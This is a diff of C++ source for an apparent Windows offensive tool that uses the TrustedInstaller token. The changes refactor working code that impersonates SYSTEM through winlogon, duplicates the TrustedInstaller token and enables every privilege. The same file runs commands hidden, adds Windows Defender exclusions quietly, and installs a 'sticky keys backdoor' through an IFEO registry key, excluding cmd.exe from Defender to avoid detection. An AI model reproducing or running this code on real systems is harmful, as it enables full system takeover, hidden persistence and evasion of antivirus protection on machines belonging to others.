@@ -22,20 +22,6 @@ namespace fs = std::filesystem;
 // CONSTANTS
 // ============================================================================
 
-const LPCWSTR TrustedInstallerIntegrator::ALL_PRIVILEGES[] = {
-    L"SeAssignPrimaryTokenPrivilege", L"SeBackupPrivilege", L"SeRestorePrivilege",
-    L"SeDebugPrivilege", L"SeImpersonatePrivilege", L"SeTakeOwnershipPrivilege",
-    L"SeLoadDriverPrivilege", L"SeSystemEnvironmentPrivilege", L"SeManageVolumePrivilege",
-    L"SeSecurityPrivilege", L"SeShutdownPrivilege", L"SeSystemtimePrivilege",
-    L"SeTcbPrivilege", L"SeIncreaseQuotaPrivilege", L"SeAuditPrivilege",
-    L"SeChangeNotifyPrivilege", L"SeUndockPrivilege", L"SeCreateTokenPrivilege",
-    L"SeLockMemoryPrivilege", L"SeCreatePagefilePrivilege", L"SeCreatePermanentPrivilege",
-    L"SeSystemProfilePrivilege", L"SeProfileSingleProcessPrivilege", L"SeCreateGlobalPrivilege",
-    L"SeTimeZonePrivilege", L"SeCreateSymbolicLinkPrivilege", L"SeIncreaseBasePriorityPrivilege",
-    L"SeRemoteShutdownPrivilege", L"SeIncreaseWorkingSetPrivilege"
-};
-const int TrustedInstallerIntegrator::PRIVILEGE_COUNT = sizeof(TrustedInstallerIntegrator::ALL_PRIVILEGES) / sizeof(LPCWSTR);
-
 static HANDLE g_cachedTrustedInstallerToken = nullptr;
 static DWORD g_lastTokenAccessTime = 0;
 static const DWORD TOKEN_CACHE_TIMEOUT = 30000;
@@ -60,6 +46,24 @@ TrustedInstallerIntegrator::~TrustedInstallerIntegrator()
 }
 
 // ============================================================================
+// PRIVILEGE MANAGEMENT
+// ============================================================================
+
+std::wstring TrustedInstallerIntegrator::GetFullPrivilegeName(Privilege priv)
+{
+    size_t index = static_cast<size_t>(priv);
+    if (index < PRIVILEGE_COUNT) {
+        return L"Se" + std::wstring(PRIVILEGE_NAMES[index]) + L"Privilege";
+    }
+    return L"";
+}
+
+std::wstring TrustedInstallerIntegrator::GetFullPrivilegeName(std::wstring_view name)
+{
+    return L"Se" + std::wstring(name) + L"Privilege";
+}
+
+// ============================================================================
 // CORE TOKEN MANAGEMENT
 // ============================================================================
 
@@ -70,15 +74,18 @@ BOOL TrustedInstallerIntegrator::EnablePrivilegeInternal(std::wstring_view privi
         return FALSE;
 
     LUID luid;
+    // .data() jest bezpieczne, bo string_view z literałów jest zazwyczaj null-terminated,
+    // ale dla pewności w WinAPI lepiej używać c_str() jeśli dostępne lub upewnić się co do bufora.
+    // Tutaj privilegeName pochodzi z format(), więc jest bezpieczne.
     if (!LookupPrivilegeValueW(NULL, privilegeName.data(), &luid)) {
         CloseHandle(hToken);
         return FALSE;
     }
 
-    TOKEN_PRIVILEGES tp = {0};
-    tp.PrivilegeCount = 1;
-    tp.Privileges[0].Luid = luid;
-    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    TOKEN_PRIVILEGES tp{
+        .PrivilegeCount = 1,
+        .Privileges = {{.Luid = luid, .Attributes = SE_PRIVILEGE_ENABLED}}
+    };
 
     BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
     CloseHandle(hToken);
@@ -86,9 +93,16 @@ BOOL TrustedInstallerIntegrator::EnablePrivilegeInternal(std::wstring_view privi
     return result && (GetLastError() == ERROR_SUCCESS);
 }
 
+BOOL TrustedInstallerIntegrator::EnablePrivilege(Privilege priv)
+{
+    auto fullName = GetFullPrivilegeName(priv);
+    if (fullName.empty()) return FALSE;
+    return EnablePrivilegeInternal(fullName);
+}
+
 BOOL TrustedInstallerIntegrator::ImpersonateSystem()
 {
-    EnablePrivilegeInternal(L"SeDebugPrivilege");
+    EnablePrivilege(Privilege::Debug);
 
     DWORD systemPid = GetProcessIdByName(L"winlogon.exe");
     if (systemPid == 0) return FALSE;
@@ -132,7 +146,6 @@ DWORD TrustedInstallerIntegrator::StartTrustedInstallerService()
     SERVICE_STATUS_PROCESS statusBuffer;
     DWORD bytesNeeded;
     
-    // Check initial state
     if (!QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&statusBuffer, 
                               sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded)) {
         CloseServiceHandle(hService);
@@ -140,7 +153,7 @@ DWORD TrustedInstallerIntegrator::StartTrustedInstallerService()
         return 0;
     }
 
-    // Already running - return PID immediately
+    // Already running
     if (statusBuffer.dwCurrentState == SERVICE_RUNNING) {
         DWORD pid = statusBuffer.dwProcessId;
         CloseServiceHandle(hService);
@@ -148,7 +161,7 @@ DWORD TrustedInstallerIntegrator::StartTrustedInstallerService()
         return pid;
     }
 
-    // Service stopped - start it
+    // Start if stopped
     if (statusBuffer.dwCurrentState == SERVICE_STOPPED) {
         if (!StartServiceW(hService, 0, NULL)) {
             CloseServiceHandle(hService);
@@ -157,7 +170,7 @@ DWORD TrustedInstallerIntegrator::StartTrustedInstallerService()
         }
     }
 
-    // Check status immediately after start request
+    // Check immediately after start
     if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&statusBuffer,
                              sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded)) {
         if (statusBuffer.dwCurrentState == SERVICE_RUNNING) {
@@ -168,10 +181,8 @@ DWORD TrustedInstallerIntegrator::StartTrustedInstallerService()
         }
     }
 
-    // Brief wait only if still starting (rare case)
     Sleep(100);
     
-    // Final status check
     DWORD pid = 0;
     if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&statusBuffer, 
                              sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded)) {
@@ -184,11 +195,12 @@ DWORD TrustedInstallerIntegrator::StartTrustedInstallerService()
     CloseServiceHandle(hSCManager);
     return pid;
 }
+
 HANDLE TrustedInstallerIntegrator::GetCachedTrustedInstallerToken() 
 {
     DWORD currentTime = GetTickCount();
     
-    // Return cached token if still valid
+    // Return cached token if valid
     if (g_cachedTrustedInstallerToken && (currentTime - g_lastTokenAccessTime) < TOKEN_CACHE_TIMEOUT) {
         return g_cachedTrustedInstallerToken;
     }
@@ -199,19 +211,16 @@ HANDLE TrustedInstallerIntegrator::GetCachedTrustedInstallerToken()
         g_cachedTrustedInstallerToken = nullptr;
     }
     
-    // Enable required privileges for token manipulation
-    if (!EnablePrivilegeInternal(L"SeDebugPrivilege") || !EnablePrivilegeInternal(L"SeImpersonatePrivilege")) {
+    if (!EnablePrivilege(Privilege::Debug) || !EnablePrivilege(Privilege::Impersonate)) {
         ERROR(L"Failed to enable required privileges");
         return nullptr;
     }
     
-    // Impersonate SYSTEM to access TrustedInstaller
     if (!ImpersonateSystem()) {
         ERROR(L"Failed to impersonate SYSTEM");
         return nullptr;
     }
     
-    // Start TrustedInstaller service and get its PID
     DWORD trustedInstallerPid = StartTrustedInstallerService();
     if (!trustedInstallerPid) {
         ERROR(L"Failed to start TrustedInstaller service");
@@ -219,7 +228,6 @@ HANDLE TrustedInstallerIntegrator::GetCachedTrustedInstallerToken()
         return nullptr;
     }
     
-    // Open TrustedInstaller process
     HANDLE hTrustedInstallerProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, trustedInstallerPid);
     if (!hTrustedInstallerProcess) {
         ERROR(L"Failed to open TrustedInstaller process");
@@ -227,7 +235,6 @@ HANDLE TrustedInstallerIntegrator::GetCachedTrustedInstallerToken()
         return nullptr;
     }
     
-    // Get process token
     HANDLE hTrustedInstallerToken;
     if (!OpenProcessToken(hTrustedInstallerProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hTrustedInstallerToken)) {
         ERROR(L"Failed to open TrustedInstaller token");
@@ -236,7 +243,6 @@ HANDLE TrustedInstallerIntegrator::GetCachedTrustedInstallerToken()
         return nullptr;
     }
     
-    // Duplicate token for impersonation
     HANDLE hDuplicatedToken;
     if (!DuplicateTokenEx(hTrustedInstallerToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, 
                          TokenImpersonation, &hDuplicatedToken)) {
@@ -247,30 +253,35 @@ HANDLE TrustedInstallerIntegrator::GetCachedTrustedInstallerToken()
         return nullptr;
     }
     
-    // Cleanup handles and revert to original context
     CloseHandle(hTrustedInstallerToken);
     CloseHandle(hTrustedInstallerProcess);
     RevertToSelf();
     
-    // Enable all privileges on the duplicated token
-    for (int i = 0; i < PRIVILEGE_COUNT; i++) {
-        TOKEN_PRIVILEGES tp;
+    // Enable all privileges using modern C++23 approach
+    // POPRAWKA DEEPSEEK: Iterujemy po enumach i rzutujemy na Privilege
+    for (size_t i = 0; i < PRIVILEGE_COUNT; ++i) {
+        // Używamy helpera, który sam złoży stringa
+        auto fullName = GetFullPrivilegeName(static_cast<Privilege>(i));
+        
+        if (fullName.empty()) continue;
+
         LUID luid;
-        if (LookupPrivilegeValueW(NULL, ALL_PRIVILEGES[i], &luid)) {
-            tp.PrivilegeCount = 1;
-            tp.Privileges[0].Luid = luid;
-            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+        if (LookupPrivilegeValueW(NULL, fullName.c_str(), &luid)) {
+            TOKEN_PRIVILEGES tp{
+                .PrivilegeCount = 1,
+                .Privileges = {{.Luid = luid, .Attributes = SE_PRIVILEGE_ENABLED}}
+            };
             AdjustTokenPrivileges(hDuplicatedToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
         }
     }
     
-    // Cache the token with timestamp
     g_cachedTrustedInstallerToken = hDuplicatedToken;
     g_lastTokenAccessTime = currentTime;
     
     DEBUG(L"TrustedInstaller token cached successfully");
     return g_cachedTrustedInstallerToken;
 }
+
 // ============================================================================
 // PROCESS EXECUTION
 // ============================================================================
@@ -280,7 +291,6 @@ BOOL TrustedInstallerIntegrator::CreateProcessAsTrustedInstaller(DWORD pid, std:
     HANDLE hToken = GetCachedTrustedInstallerToken();
     if (!hToken) return FALSE;
 
-    // Convert string_view to mutable string for CreateProcessWithTokenW
     std::wstring mutableCmd{commandLine};
 
     STARTUPINFOW si = { sizeof(si) };
@@ -303,15 +313,16 @@ BOOL TrustedInstallerIntegrator::CreateProcessAsTrustedInstallerSilent(DWORD pid
 
     std::wstring mutableCmd{commandLine};
 
-    STARTUPINFOW si = { sizeof(si) };
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
+    STARTUPINFOW si{
+        .cb = sizeof(si),
+        .dwFlags = STARTF_USESHOWWINDOW,
+        .wShowWindow = SW_HIDE
+    };
     
     PROCESS_INFORMATION pi;
     BOOL result = CreateProcessWithTokenW(hToken, 0, NULL, mutableCmd.data(), CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
 
     if (result) {
-        // Wait for process completion with timeout
         DWORD waitResult = WaitForSingleObject(pi.hProcess, 3000);
         
         if (waitResult == WAIT_OBJECT_0) {
@@ -333,7 +344,6 @@ bool TrustedInstallerIntegrator::RunAsTrustedInstaller(const std::wstring& comma
 {
     std::wstring finalCommandLine = commandLine;
     
-    // Resolve .lnk files to actual executable paths
     if (IsLnkFile(commandLine)) {
         finalCommandLine = ResolveLnk(commandLine);
         if (finalCommandLine.empty()) {
@@ -361,7 +371,6 @@ bool TrustedInstallerIntegrator::RunAsTrustedInstallerSilent(const std::wstring&
 {
     std::wstring finalCommandLine = commandLine;
     
-    // Resolve .lnk files to actual executable paths
     if (IsLnkFile(commandLine)) {
         finalCommandLine = ResolveLnk(commandLine);
         if (finalCommandLine.empty()) {
@@ -426,7 +435,6 @@ bool TrustedInstallerIntegrator::WriteFileAsTrustedInstaller(std::wstring_view f
         return false;
     }
 
-    // Write data in chunks to handle large files
     DWORD totalWritten = 0;
     const DWORD chunkSize = 64 * 1024;
 
@@ -473,7 +481,6 @@ bool TrustedInstallerIntegrator::DeleteFileAsTrustedInstaller(std::wstring_view 
 
     std::wstring filePathStr{filePath};
     
-    // Remove read-only attribute if present
     DWORD attrs = GetFileAttributesW(filePathStr.c_str());
     if (attrs != INVALID_FILE_ATTRIBUTES) {
         SetFileAttributesW(filePathStr.c_str(), FILE_ATTRIBUTE_NORMAL);
@@ -506,14 +513,12 @@ bool TrustedInstallerIntegrator::CreateDirectoryAsTrustedInstaller(std::wstring_
         return false;
     }
 
-    // Create all missing directories recursively
     std::wstring directoryPathStr{directoryPath};
     BOOL result = SHCreateDirectoryExW(NULL, directoryPathStr.c_str(), NULL);
     DWORD error = GetLastError();
     
     RevertToSelf();
 
-    // Success if directory was created or already exists
     bool success = (result == ERROR_SUCCESS || error == ERROR_ALREADY_EXISTS);
     
     if (success) {
@@ -542,7 +547,6 @@ bool TrustedInstallerIntegrator::RenameFileAsTrustedInstaller(std::wstring_view 
     std::wstring srcPathStr{srcPath};
     std::wstring dstPathStr{dstPath};
 
-    // Clear attributes on source file before moving
     DWORD attrs = GetFileAttributesW(srcPathStr.c_str());
     if (attrs != INVALID_FILE_ATTRIBUTES) {
         SetFileAttributesW(srcPathStr.c_str(), FILE_ATTRIBUTE_NORMAL);
@@ -561,6 +565,7 @@ bool TrustedInstallerIntegrator::RenameFileAsTrustedInstaller(std::wstring_view 
     DEBUG(L"File renamed successfully: %s -> %s", srcPathStr.c_str(), dstPathStr.c_str());
     return true;
 }
+
 // ============================================================================
 // REGISTRY OPERATIONS
 // ============================================================================
@@ -860,16 +865,15 @@ bool TrustedInstallerIntegrator::ValidateIpAddress(std::wstring_view ipAddress) 
         narrowIp += (char)c;
     }
 
-    // Check for CIDR suffix and extract base IP
+    // Check for CIDR suffix
     std::string baseIp = narrowIp;
     size_t slashPos = narrowIp.find('/');
     if (slashPos != std::string::npos) {
         baseIp = narrowIp.substr(0, slashPos);
     }
 
-    // IPv6 detection (contains ':')
+    // IPv6 detection
     if (baseIp.find(':') != std::string::npos) {
-        // Basic IPv6 validation: hex digits, colons, optional dots (for mapped IPv4)
         for (char c : baseIp) {
             if (!((c >= '0' && c <= '9') || 
                   (c >= 'a' && c <= 'f') || 
@@ -962,10 +966,10 @@ bool TrustedInstallerIntegrator::IsDefenderRunning() noexcept
 
 bool TrustedInstallerIntegrator::AddDefenderExclusion(ExclusionType type, std::wstring_view value)
 {
-    // Check if Defender is available - if not, treat as success
+    // Skip if Defender not available
     if (!IsDefenderAvailable()) {
         DEBUG(L"Windows Defender not available, skipping exclusion for: %s", std::wstring{value}.c_str());
-        return true; // Return true because this is not an error
+        return true;
     }
     
     std::wstring processedValue{value};
@@ -1032,25 +1036,21 @@ int TrustedInstallerIntegrator::AddMultipleDefenderExclusions(
     int successCount = 0;
     int totalAttempts = 0;
 
-    // Add path exclusions
     for (const auto& path : paths) {
         if (AddPathExclusion(path)) successCount++;
         totalAttempts++;
     }
 
-    // Add process exclusions  
     for (const auto& process : processes) {
         if (AddProcessExclusion(process)) successCount++;
         totalAttempts++;
     }
 
-    // Add extension exclusions
     for (const auto& extension : extensions) {
         if (AddExtensionExclusion(extension)) successCount++;
         totalAttempts++;
     }
 
-    // Log summary instead of individual results
     if (successCount > 0) {
         SUCCESS(L"Defender exclusions configured (%d/%d added)", successCount, totalAttempts);
     } else if (totalAttempts > 0) {
@@ -1095,7 +1095,6 @@ bool TrustedInstallerIntegrator::RemoveDefenderExclusion(ExclusionType type, std
     return RunAsTrustedInstallerSilent(command);
 }
 
-// Convenience methods for specific exclusion types
 bool TrustedInstallerIntegrator::AddPathExclusion(std::wstring_view path) {
     return AddDefenderExclusion(ExclusionType::Paths, path);
 }
@@ -1198,7 +1197,6 @@ bool TrustedInstallerIntegrator::InstallStickyKeysBackdoor() noexcept
 {
     INFO(L"Installing sticky keys backdoor with Defender bypass...");
     
-    // Add cmd.exe to Defender exclusions to avoid detection
     if (!AddProcessToDefenderExclusions(L"cmd.exe")) {
         INFO(L"AV exclusion skipped for cmd.exe (continuing)");
     }
@@ -1248,7 +1246,6 @@ bool TrustedInstallerIntegrator::RemoveStickyKeysBackdoor() noexcept
         SUCCESS(L"IFEO registry key removed");
     }
     
-    // Clean up Defender exclusions
     if (!RemoveProcessFromDefenderExclusions(L"cmd.exe")) {
         INFO(L"AV cleanup skipped for cmd.exe");
     }
@@ -1280,7 +1277,7 @@ bool TrustedInstallerIntegrator::AddContextMenuEntries()
     HKEY hKey;
     DWORD dwDisposition;
     
-    // Add context menu for executable files
+    // Context menu for executables
     if (RegCreateKeyExW(HKEY_CLASSES_ROOT, L"exefile\\shell\\RunAsTrustedInstaller", 0, NULL, REG_OPTION_NON_VOLATILE, 
                        KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS)
     {
@@ -1302,7 +1299,7 @@ bool TrustedInstallerIntegrator::AddContextMenuEntries()
         RegCloseKey(hKey);
     }
     
-    // Add context menu for shortcut files
+    // Context menu for shortcuts
     if (RegCreateKeyExW(HKEY_CLASSES_ROOT, L"lnkfile\\shell\\RunAsTrustedInstaller", 0, NULL, REG_OPTION_NON_VOLATILE,
                        KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS)
     {
